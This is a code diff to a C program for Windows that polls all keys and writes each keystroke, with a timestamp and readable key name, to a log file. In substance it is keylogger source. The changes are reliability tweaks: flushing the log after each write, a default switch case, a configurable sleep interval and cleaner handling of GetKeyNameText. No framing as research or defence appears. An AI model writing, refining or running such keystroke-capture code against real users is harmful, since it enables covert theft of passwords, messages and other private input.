@@ -14,6 +14,7 @@
 #define NUM_KEYS 256
 #define MAX_KEY_NAME_LENGTH 64 // Increased for longer key names
 #define MAX_ERROR_MESSAGE_LENGTH 256
+#define SLEEP_DURATION_MS 10 // Increased sleep duration for better performance
 
 // Function to get the current timestamp
 bool get_timestamp(char *timestamp, size_t timestamp_size) {
@@ -54,6 +55,7 @@ const char* get_key_name(int key) {
         case VK_RCONTROL: return "[RCTRL]";
         case VK_LMENU: return "[LALT]"; // Distinguish left and right alt
         case VK_RMENU: return "[RALT]";
+        default: break; // Added default to avoid fallthrough warnings
     }
 
     switch (key) {
@@ -72,7 +74,8 @@ const char* get_key_name(int key) {
                 return key_name;
             } else {
                 // Try to get the key name using GetKeyNameText
-                if (GetKeyNameText(scan_code << 16, key_name, MAX_KEY_NAME_LENGTH) > 0) {
+                int result = GetKeyNameText(scan_code << 16, key_name, MAX_KEY_NAME_LENGTH);
+                if (result > 0) {
                     return key_name;
                 } else {
                     snprintf(key_name, MAX_KEY_NAME_LENGTH, "[KEY:%d]", key);
@@ -103,6 +106,8 @@ bool log_keystroke(int key) {
     }
 
     fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));
+
+    fflush(file); // Flush the buffer to ensure data is written to disk
 
     if (fclose(file) == EOF) {
         int close_err = errno; // Capture errno before printing
@@ -138,7 +143,7 @@ int main() {
                 key_pressed[key] = false;
             }
         }
-        Sleep(1);
+        Sleep(SLEEP_DURATION_MS);
     }
     return 0;
 }
